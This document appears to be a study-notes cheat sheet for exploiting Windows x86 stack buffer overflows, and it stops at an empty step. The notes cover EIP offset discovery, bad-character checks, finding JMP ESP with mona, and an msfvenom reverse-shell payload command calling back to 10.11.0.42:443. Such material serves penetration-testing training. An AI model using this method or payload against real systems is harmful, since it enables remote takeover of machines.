
## Buffer Overflow - Windows x86

### Commands Overview



### Step-By-Step Guide

Some BO guides:
* https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/

__Fuzzing -> Determine exact offset -> Control EIP register__

1. Fuzz application to determine rough amount of bytes to cause a crash.
2. Generate offset-discovery string: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700`
3. Run script with-offset discovery string + look at value in EIP
    * EIP is where we want to store address of a JMP ESP instruction
    * Execution flow: EIP -> JMP ESP -> ESP (shellcode location)
3. Calculate offset: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [value in EIP]`

Now we know the exact #bytes needed to reach/control the EIP register so that we can overwrite it with JMP ESP address.

__Checking for bad chars__

1. Generate string of bad characters (0x00 -> 0xFF)
2. Use list of bad chars as payload + execute script.
3. Observe crash + goto location in ESP register (right-click -> follow-in-dump)
4. Observe the hex dump and see which character has truncated the rest of the payload that should come after it.
5. Remove character from buffer + repeat steps until all bad chars have been found.

__Find address of a JMP ESP in a DLL__

We need to find a module that contains a `JMP ESP` instruction which we can point to.

1. `!mona modules` to list all the loaded modules for the application.
2. Find a module that has no internal security mechanisms:
   * No memory protection (ASLR: address randomisation / DEP: data execution prevention)
   * Memory range of DLL does not contain bad characters
3. Find a `JMP ESP` or equivalent instruction in the DLL.
   * Click on the Executable Modules `e` icon to show list of all modules/DLLs loaded with the application.
   * Locate the chosen DLL in step #3 and click on the DLL.
   * Right-click on instruction window -> Search For -> Command -> `JMP ESP`
   * If none are found: Search For -> Command Sequence -> `PUSH ESP | RETN` (equivalent command)
   * If none are found: `!Mona find -s "\xFF\xE4" -m slmfc.dll` to find the opcode for `JMP ESP` in the whole slmfc.dll.
4. Once `JMP ESP` has been found, verify that the address does actually contain the instruction
   * Click on "Go to address in disassembler" button then enter in the address.
   * Check that the address has `JMP ESP`

__Generate and use shellcode__

!! MAKE SURE YOU HAVE A LISTENER RUNNING BEFORE YOU EXECUTE THE EXPLOIT !!

1. Generate shellcode, target specific platform (windows x86), encode payload, avoid bad characters
   `$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
   In front of the shellcode are instructions to decode the encoded payload.
2. We need to provide the shellcode docoder some stack-space to work with
   * Append NOP instructions to the front of the payload e.g. `"\x90 * 16"`
3. 
